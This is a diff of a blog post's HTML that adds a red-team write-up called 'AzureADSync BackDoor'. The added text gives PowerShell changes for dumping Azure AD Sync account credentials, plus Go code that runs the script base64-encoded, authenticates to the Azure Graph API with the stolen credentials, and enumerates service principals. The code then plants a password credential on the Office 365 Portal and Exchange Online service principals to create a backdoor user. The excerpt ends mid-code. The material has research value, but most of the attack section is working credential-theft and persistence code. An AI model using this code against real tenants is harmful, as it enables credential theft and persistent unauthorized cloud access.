@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="Latortuga71 ">
 <meta name="description" content="Recently created a golang binary that dumps credentials from the AD Sync Server and creates a user in azure and assigns it to any group in AzureAD you like. Check out the work done by Adam Chester and Dirk-jan at the following links below as this could have not been possible without their hard work and research. Seriously read those both as everything ive done piggybacks of them.
- Dirk-jan&amp;rsquo;s blog post Adam Chester&amp;rsquo;s blog post  Dump creds?" />
+ Dirk-jan&amp;rsquo;s blog post Adam Chester&amp;rsquo;s blog post  tldr Dump AD Sync creds via powershell." />
 <meta name="keywords" content=", Golang, Azure, AzureAD" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#252627" />
@@ -42,10 +42,10 @@
 
 <meta itemprop="name" content="AzureADSync BackDoor">
 <meta itemprop="description" content="Recently created a golang binary that dumps credentials from the AD Sync Server and creates a user in azure and assigns it to any group in AzureAD you like. Check out the work done by Adam Chester and Dirk-jan at the following links below as this could have not been possible without their hard work and research. Seriously read those both as everything ive done piggybacks of them.
- Dirk-jan&rsquo;s blog post Adam Chester&rsquo;s blog post  Dump creds?">
+ Dirk-jan&rsquo;s blog post Adam Chester&rsquo;s blog post  tldr Dump AD Sync creds via powershell.">
 <meta itemprop="datePublished" content="2020-05-28T08:53:31-05:00" />
 <meta itemprop="dateModified" content="2020-05-28T08:53:31-05:00" />
-<meta itemprop="wordCount" content="192">
+<meta itemprop="wordCount" content="1626">
 <meta itemprop="image" content="https://christopherja.rocks/"/>
 
 
@@ -55,7 +55,7 @@
 
 <meta name="twitter:title" content="AzureADSync BackDoor"/>
 <meta name="twitter:description" content="Recently created a golang binary that dumps credentials from the AD Sync Server and creates a user in azure and assigns it to any group in AzureAD you like. Check out the work done by Adam Chester and Dirk-jan at the following links below as this could have not been possible without their hard work and research. Seriously read those both as everything ive done piggybacks of them.
- Dirk-jan&rsquo;s blog post Adam Chester&rsquo;s blog post  Dump creds?"/>
+ Dirk-jan&rsquo;s blog post Adam Chester&rsquo;s blog post  tldr Dump AD Sync creds via powershell."/>
 
 
 
@@ -122,7 +122,7 @@
     <main class="post">
 
         <div class="post-info">
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>One minute
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>8 minutes
 
             
 
@@ -142,24 +142,270 @@
 <li><a href="https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/">Dirk-jan&rsquo;s blog post</a></li>
 <li><a href="https://blog.xpnsec.com/azuread-connect-for-redteam/#more">Adam Chester&rsquo;s blog post</a></li>
 </ul>
+<h2 id="tldr">tldr</h2>
+<p>Dump AD Sync creds via powershell. Used dotpeek and fiddler to reverse powershell cmdlets since they call graph api. Use those dumped creds to call api. Assign passwords to built in apps with better permissios than Sync Acc. Sign in as those apps and create backdoor.</p>
 <h2 id="dump-creds">Dump creds?</h2>
-<p>Heres how i edited adams scipt to also dump azure users creds</p>
-<h2 id="authenticate-with-dumped-creds">Authenticate with dumped creds</h2>
-<p>heres how i authenticated to the graph api with those creds</p>
+<p>In my test environment i ran adams powershell POC scipt and noticed it only dumped the on prem sync account credentials.
+Which is fantastic as you can now perform a DC Sync attack. But my focus was on pivoting to the cloud with something a little more than user permissions. I was able to modify the script slightly by changing the following lines</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$domain = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-domain&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Domain&#39;</span>; Expression = {$_.node.InnerText}}
+$username = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-user&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Username&#39;</span>; Expression = {$_.node.InnerText}}
+$password = select-xml -Content $decrypted -XPath <span style="color:#e6db74">&#34;//attribute&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Password&#39;</span>; Expression = {$_.node.InnerText}}
+
+Write-Host <span style="color:#e6db74">&#34;[*] On Prem Credentials&#34;</span>
+Write-Host <span style="color:#e6db74">&#34;Domain: </span>$($domain.Domain)<span style="color:#e6db74">&#34;</span>
+Write-Host <span style="color:#e6db74">&#34;Username: </span>$($username.Username)<span style="color:#e6db74">&#34;</span>
+Write-Host <span style="color:#e6db74">&#34;Password: </span>$($password.Password)<span style="color:#e6db74">&#34;</span>
+</code></pre></div><p>to</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$username = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;UserName&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Username&#39;</span>; Expression = {$_.node.InnerText}}
+$password = select-xml -Content $decrypted -XPath <span style="color:#e6db74">&#34;//attribute&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Password&#39;</span>; Expression = {$_.node.InnerText}}
+
+Write-Host <span style="color:#e6db74">&#34;[*] Credentials incoming...</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>
+Write-Host <span style="color:#e6db74">&#34;[*] Azure Credentials&#34;</span>
+Write-Host <span style="color:#e6db74">&#34;UserName: </span>$($username.UserName)<span style="color:#e6db74">&#34;</span>
+Write-Host <span style="color:#e6db74">&#34;Password: </span>$($password.Password)<span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>
+
+</code></pre></div><p>The Details of how the powershell script is able to dump credentials in the first place can be found above (seriously check it out)
+I encoded the above powershell script in base64 and run it within the golang code just for ease of use.
+The function that performs the dump is below</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">DumpCreds</span>()<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span> {
+    <span style="color:#a6e22e">posh</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">New</span>()
+    <span style="color:#75715e">//fmt.Println(&#34;With encoding change:&#34;)
+</span><span style="color:#75715e"></span>     <span style="color:#a6e22e">stdout</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">posh</span>.<span style="color:#a6e22e">Execute</span>(<span style="color:#e6db74">`//5XAHIAaQB0AGUALQBIAG8Ac...`</span>)
+     <span style="color:#a6e22e">s</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">stdout</span>,<span style="color:#e6db74">&#34;\n&#34;</span>)
+
+    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">stdout</span>)
+
+    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
+    }
+
+    <span style="color:#a6e22e">User</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">s</span>[<span style="color:#ae81ff">10</span>],<span style="color:#e6db74">&#34;:&#34;</span>)
+    <span style="color:#a6e22e">Pass</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">s</span>[<span style="color:#ae81ff">11</span>],<span style="color:#e6db74">&#34;:&#34;</span>)
+    <span style="color:#a6e22e">UserName</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">TrimSpace</span>(<span style="color:#a6e22e">User</span>[<span style="color:#ae81ff">1</span>])
+    <span style="color:#a6e22e">PassWord</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">TrimSpace</span>(<span style="color:#a6e22e">Pass</span>[<span style="color:#ae81ff">1</span>])
+    <span style="color:#a6e22e">AzureCredsMap</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>)
+    <span style="color:#a6e22e">AzureCredsMap</span>[<span style="color:#e6db74">&#34;AzureUserName&#34;</span>] = <span style="color:#a6e22e">UserName</span>
+    <span style="color:#a6e22e">AzureCredsMap</span>[<span style="color:#e6db74">&#34;AzurePassWord&#34;</span>] = <span style="color:#a6e22e">PassWord</span>
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">AzureCredsMap</span>
+</code></pre></div><h2 id="authenticate-with-dumped-creds">Authenticate with dumped creds</h2>
+<p>So at this point you have the sync account credentials.</p>
+<p><img src="https://christopherja.rocks/credsOutput.png" alt="asmi popup"></p>
+<p>Now we can authenticate to the graph.windows.net api using go</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">auth</span>(<span style="color:#a6e22e">resource_url</span> <span style="color:#66d9ef">string</span>,<span style="color:#a6e22e">credsMap</span> <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>,<span style="color:#a6e22e">tenantId</span> <span style="color:#66d9ef">string</span>) <span style="color:#a6e22e">Token_t</span>{
+    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;\n[*] Attempting to Authenticate to Azure...&#34;</span>)
+    <span style="color:#a6e22e">pass</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">credsMap</span>[<span style="color:#e6db74">&#34;AzurePassWord&#34;</span>]
+    <span style="color:#a6e22e">user</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">credsMap</span>[<span style="color:#e6db74">&#34;AzureUserName&#34;</span>]
+    <span style="color:#75715e">//os.Exit(2)
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">formData</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">Values</span>{
+    <span style="color:#e6db74">&#34;grant_type&#34;</span>:{<span style="color:#e6db74">&#34;password&#34;</span>},
+    <span style="color:#e6db74">&#34;resource&#34;</span>:{<span style="color:#a6e22e">resource_url</span>},
+    <span style="color:#e6db74">&#34;client_id&#34;</span>:{<span style="color:#e6db74">&#34;a0c73c16-a7e3-4564-9a95-2bdf47383716&#34;</span>}, <span style="color:#75715e">//needed as client id its default powershell                      
+</span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;username&#34;</span>:{<span style="color:#a6e22e">user</span>},
+    <span style="color:#e6db74">&#34;password&#34;</span>:{<span style="color:#a6e22e">pass</span>},
+    }
+    <span style="color:#75715e">//fmt.Println(tenantId)
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">url</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;https://login.microsoftonline.com/%s/oauth2/token&#34;</span>,<span style="color:#a6e22e">tenantId</span>)
+    <span style="color:#a6e22e">resp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">PostForm</span>(<span style="color:#a6e22e">url</span>,<span style="color:#a6e22e">formData</span>) <span style="color:#75715e">// contains tenant id
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+        panic(<span style="color:#a6e22e">err</span>)
+    }
+    <span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>.<span style="color:#a6e22e">Close</span>()
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">result</span> <span style="color:#a6e22e">Token_t</span>
+    <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">NewDecoder</span>(<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>).<span style="color:#a6e22e">Decode</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">result</span>)
+
+    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">AccessToken</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>{
+        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;\nYou couldnt get a token, invalid credentials perhaps???\n&#34;</span>)
+        <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">2</span>)
+    }
+    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;\n[*] Successfully Authenticated To Azure&#34;</span>)
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>
+}
+</code></pre></div><p>If successful you get an auth token back.</p>
+<h2 id="strategy-going-forward">Strategy Going Forward</h2>
+<p>At this point i wasnt sure how to proceed i know i want to list service principals. And this specific api that i am calling is outdated and not documented that well or at all.</p>
+<p>So i decided to use the powershell AzureAD Cmdlets and try to see how those call the api. There is a log file that logs all the methods called by the cmdlets. here is an example</p>
+<p><img src="https://christopherja.rocks/pwshlog.png" alt=""></p>
+<p>You can see calls to get and set service principal&hellip;I didnt know what that meant. So i found the dll that correspondes to that cmdlet.
+And loaded it into dotpeek (My new favorite tool)</p>
+<h3 id="dotpeek">dotpeek</h3>
+<p>Dot peek is amazing. It decompiled the dll and if you highlight a method it allows you to jump to the declaration.
+Doing this i was able to see the get and set methods parameters. Which revealed a GET and PATCH request respectively as well as the parameters for the patch</p>
+<p><img src="https://christopherja.rocks/dotpeek.png" alt=""></p>
+<p>Using this is gained alot of insight. But still i had alot of issues calling the right endpoints since i didnt know exactly what the request body needed to look like to patch a password credential object to a Service principal.</p>
+<h3 id="fiddler">Fiddler</h3>
+<p>Fiddler solved all my questions about the api and exactly how requests needed to be formatted.
+I was able to install the certificate on my windows machine to see the SSL traffic now in clear text.</p>
+<p><img src="https://christopherja.rocks/fiddler.png" alt=""></p>
+<p>Now all i needed to do was the folllowing.</p>
+<p><img src="https://christopherja.rocks/powersh.png" alt=""></p>
+<p>And look at the output on fiddler and model my golang code after that.</p>
 <h2 id="list-service-principals--roles">List service principals &amp; roles</h2>
-<p>heres how i listed the service principals and got what roles they had</p>
-<h2 id="well-these-two-work-lets-use-those">Well these two work lets use those</h2>
-<p>heres why i used those two apps and not the other better ones</p>
+<p>After figuring out how to exactly call each api and the format needed i was able to proceed with writing the code based on the fiddler output.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GetSPs</span>(<span style="color:#a6e22e">token</span> <span style="color:#66d9ef">string</span>,<span style="color:#a6e22e">tenantId</span> <span style="color:#66d9ef">string</span>)<span style="color:#a6e22e">AllTheSpns_t</span>{
+    <span style="color:#a6e22e">url</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;https://graph.windows.net/%s/servicePrincipals/?api-version=1.6&amp;$top=999&#34;</span>,<span style="color:#a6e22e">tenantId</span>)
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">bearer</span> = <span style="color:#e6db74">&#34;Bearer &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span>
+    <span style="color:#75715e">// Create a new request using http
+</span><span style="color:#75715e"></span>
+    <span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">NewRequest</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">url</span>,<span style="color:#66d9ef">nil</span> ) <span style="color:#75715e">//bytes.NewBuffer(jsonStr)
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// add authorization header to the req
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Add</span>(<span style="color:#e6db74">&#34;Authorization&#34;</span>, <span style="color:#a6e22e">bearer</span>)
+    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Add</span>(<span style="color:#e6db74">&#34;Content-type&#34;</span>,<span style="color:#e6db74">&#34;application/json&#34;</span>)
+
+    <span style="color:#75715e">// Send req using http Client
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">client</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Client</span>{}
+    <span style="color:#a6e22e">resp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">Do</span>(<span style="color:#a6e22e">req</span>)
+    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Error on response.\n[ERRO] -&#34;</span>, <span style="color:#a6e22e">err</span>)
+    }
+
+    <span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>.<span style="color:#a6e22e">Close</span>()
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">result</span> <span style="color:#a6e22e">AllTheSpns_t</span>
+
+    <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">NewDecoder</span>(<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>).<span style="color:#a6e22e">Decode</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">result</span>)
+
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>
+}
+</code></pre></div><h2 id="microsoft-office-365-portal--office-365-exchange-online">Microsoft Office 365 Portal &amp; Office 365 Exchange Online</h2>
+<p>I was able to get a list of all service principals available, i didnt have many and needed to add a trial 0365 license to my tenant to view some of the better ones with more permissions such as Microsoft Office 365 Portal &amp; Office 365 Exchange Online.
+dirkjan goes into detail on his blog post on assigning credentials to these apps and checking the roles they are assigned.
+For some reason i was not able to login to many of the apps after assigning a password credential (i would get back a client secret invalid error). Only a few and the ones that i was able to login to didnt have many roles assigned.
+I settled on using Microsoft Office 365 Portal &amp; Office 365 Exchange Online in tandem as one has user.ReadWrite access and the other has group.ReadWrite Access.</p>
 <h2 id="create-useradd-to-group">Create user/add to group</h2>
-<p>heres the code for adding the user to the group</p>
-<h2 id="well-now-what">Well now what</h2>
-<p>heres some screenshots of the audit logs and event viewer</p>
+<p>Basically the code loops through the list of SPN&rsquo;s returned and looks for those two display names.
+Then adds a predefined password credential to both service principals. Logs in as each and creates as user then loops through the azure AD groups available and asks if the user should be added.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">SPNs</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">GetSPs</span>(<span style="color:#a6e22e">authToken</span>,<span style="color:#a6e22e">TenantId</span>)
+    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>{
+        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppDisplayName</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Microsoft Office 365 Portal&#34;</span>{
+            <span style="color:#a6e22e">O365Found</span> = <span style="color:#66d9ef">true</span>
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found 0365 Portal App&#34;</span>)
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Attempting to add Password Credential&#34;</span>)
+            <span style="color:#a6e22e">O365AppObjId</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">ObjectID</span>
+            <span style="color:#a6e22e">O365AppId</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppID</span>
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found Obj ID&#34;</span>)
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">O365AppObjId</span>)
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found App ID&#34;</span>)
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">O365AppId</span>)
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">NewCredsToAdd</span> <span style="color:#a6e22e">PasswordCredentials</span>
+            <span style="color:#a6e22e">NewCredsToAdd</span>.<span style="color:#a6e22e">StartDate</span> = <span style="color:#a6e22e">now_t</span>
+            <span style="color:#a6e22e">NewCredsToAdd</span>.<span style="color:#a6e22e">EndDate</span> = <span style="color:#a6e22e">then_t</span>
+            <span style="color:#a6e22e">NewCredsToAdd</span>.<span style="color:#a6e22e">Value</span> = <span style="color:#a6e22e">pwndpass</span>
+            <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span> = append(<span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span>,<span style="color:#a6e22e">NewCredsToAdd</span>)
+            <span style="color:#a6e22e">Ready2PostPassWords</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">interface</span>{})
+            <span style="color:#a6e22e">Ready2PostPassWords</span>[<span style="color:#e6db74">&#34;passwordCredentials&#34;</span>] = <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span>
+            <span style="color:#a6e22e">AddPassResult</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">AddPasswordToSP</span>(<span style="color:#a6e22e">authToken</span>,<span style="color:#a6e22e">Ready2PostPassWords</span>,<span style="color:#a6e22e">O365AppObjId</span>,<span style="color:#a6e22e">TenantId</span>)
+            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">AddPassResult</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;error&#34;</span> {
+                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Error Adding PasswordCredential To O365 Portal App&#34;</span>)
+                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Exiting....&#34;</span>)
+                <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">2</span>)
+            }<span style="color:#66d9ef">else</span>{
+                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Successfully Added PasswordCredentials To O365 Portal App&#34;</span>)
+                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[*] PasswordCredentials :=&gt; %s : %s\n&#34;</span>,<span style="color:#a6e22e">O365AppId</span>,<span style="color:#a6e22e">NewCredsToAdd</span>.<span style="color:#a6e22e">Value</span>)
+            }
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[*] Attempting To Login As The O365 Application...\n&#34;</span>)
+            <span style="color:#a6e22e">O365AuthTokenStruct</span> = <span style="color:#a6e22e">authAsSPN</span>(<span style="color:#e6db74">&#34;https://graph.windows.net&#34;</span>,<span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppID</span>,<span style="color:#a6e22e">NewCredsToAdd</span>.<span style="color:#a6e22e">Value</span>.(<span style="color:#66d9ef">string</span>),<span style="color:#a6e22e">TenantId</span>)
+
+        }
+         <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppDisplayName</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Office 365 Exchange Online&#34;</span>{
+            <span style="color:#75715e">//fmt.Println(SPNs.Value[x].AppDisplayName)
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">ExchangeFound</span> = <span style="color:#66d9ef">true</span>
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found Exchange Online App&#34;</span>)
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Attempting to add Password Credential&#34;</span>)
+            <span style="color:#a6e22e">ExchangeAppObjId</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">ObjectID</span>
+            <span style="color:#a6e22e">ExchangeAppId</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppID</span>
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found Obj ID&#34;</span>)
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">ExchangeAppObjId</span>)
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found App ID&#34;</span>)
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">ExchangeAppId</span>)
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">NewCredsToAddExchange</span> <span style="color:#a6e22e">PasswordCredentials</span>
+            <span style="color:#a6e22e">NewCredsToAddExchange</span>.<span style="color:#a6e22e">StartDate</span> = <span style="color:#a6e22e">now_t</span>
+            <span style="color:#a6e22e">NewCredsToAddExchange</span>.<span style="color:#a6e22e">EndDate</span> = <span style="color:#a6e22e">then_t</span>
+            <span style="color:#a6e22e">NewCredsToAddExchange</span>.<span style="color:#a6e22e">Value</span> = <span style="color:#a6e22e">pwndpass</span>
+            <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span> = append(<span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span>,<span style="color:#a6e22e">NewCredsToAddExchange</span>)
+            <span style="color:#a6e22e">Ready2PostPassWordsExchange</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">interface</span>{})
+            <span style="color:#a6e22e">Ready2PostPassWordsExchange</span>[<span style="color:#e6db74">&#34;passwordCredentials&#34;</span>] = <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span>
+            <span style="color:#a6e22e">AddPassResultExchange</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">AddPasswordToSP</span>(<span style="color:#a6e22e">authToken</span>,<span style="color:#a6e22e">Ready2PostPassWordsExchange</span>,<span style="color:#a6e22e">ExchangeAppObjId</span>,<span style="color:#a6e22e">TenantId</span>)
+            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">AddPassResultExchange</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;error&#34;</span> {
